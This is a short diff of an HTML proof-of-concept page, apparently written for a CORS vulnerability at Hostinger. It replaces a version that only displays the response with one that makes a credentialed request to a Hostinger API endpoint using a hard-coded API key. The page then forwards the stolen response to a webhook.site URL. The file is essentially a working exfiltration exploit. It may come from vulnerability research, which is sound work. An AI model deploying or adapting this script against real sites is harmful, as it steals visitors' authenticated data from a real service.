@@ -1,24 +1,30 @@
 <!DOCTYPE html>
 <html>
+  <head>
+    <title>Hostinger CORS Exploit PoC</title>
+  </head>
   <body>
-    <h2>CORS PoC</h2>
+    <h1>CORS Exploit Demo</h1>
     <script>
-      fetch("https://hpanel.hostinger.com/api/message-hub/api/v1/chat/init", {
+    fetch("https://experiment-api.hostinger.com/sdk/v2/vardata?v=0", {
+      method: "GET",
+      credentials: "include",
+      headers: {
+        "Authorization": "Api-Key client-cW5zRM9wiB0Wa9KqimmHzMcWGBXkKSK6"
+      }
+    })
+    .then(res => res.text())
+    .then(data => {
+      // send the response to your server or webhook
+      fetch("https://webhook.site/your-webhook-id", {
         method: "POST",
-        credentials: "include",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ test: "cors-poc" })
-      })
-      .then(res => res.text())
-      .then(data => {
-        document.body.innerHTML += `<pre>${data}</pre>`;
-      })
-      .catch(err => {
-        document.body.innerHTML += `<pre>❌ Error:\n${err}</pre>`;
+        body: data
       });
+    });
     </script>
   </body>
 </html>
+
 
 
 
